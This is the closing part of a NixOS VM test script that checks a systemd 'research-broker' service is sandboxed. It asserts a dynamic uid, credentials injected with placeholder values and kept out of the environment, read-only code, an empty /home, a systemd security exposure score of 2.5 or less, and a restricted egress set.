    assert 61184 <= probe["uid"] <= 65519, f"not a DynamicUser uid: {probe['uid']}"
    # Exactly the eight keyed-API credentials, readable, and none in env.
    assert sorted(probe["creds"]) == sorted([
        "exa-api-key", "tavily-api-key", "euipo-client-id", "euipo-client-secret",
        "ebay-client-id", "ebay-client-secret", "tradera-app-id", "tradera-app-key",
    ]), f"credentials: {sorted(probe['creds'])}"
    assert probe["creds"] == {n: f"FAKE-{n}" for n, _ in broker_creds}, probe["creds"]
    assert probe["env_has_fake"] is False, "a key reached the broker's environment"
    # Sees only its two code dirs of the checkout, read-only; no /home.
    assert probe["home"] == ["ok", []], f"/home must be an empty tmpfs: {probe['home']}"
    assert probe["write_code"][0] == "err", f"code dir must be read-only: {probe['write_code']}"
    assert probe["scraper_code"] == ["ok", True], probe["scraper_code"]
    # Still reaches what the real broker needs.
    assert probe["scraper_token"] == ["ok", True], f"scraper bearer unreadable: {probe['scraper_token']}"
    assert probe["loopback_scraper"] == ["ok", 200], f"host :8123 unreachable: {probe['loopback_scraper']}"
    assert probe["upstream"] == ["ok", 200], f"curl_cffi upstream call failed: {probe['upstream']}"

    # Hardening, scored by systemd itself; a regression fails the lane.
    sec = dellan.succeed("systemd-analyze security --no-pager research-broker.service")
    m = re.search(r"Overall exposure level for research-broker\.service: ([0-9.]+)", sec)
    assert m, sec
    print(f"[diag] research-broker exposure: {m.group(1)}")
    assert float(m.group(1)) <= 2.5, f"research-broker exposure {m.group(1)} > 2.5:\n{sec}"

    final = egress_set()
    print("[diag] set after test:\n" + final)
    assert "192.168.1.12" not in final, "unlisted name's address leaked into the egress set"
  '';
}
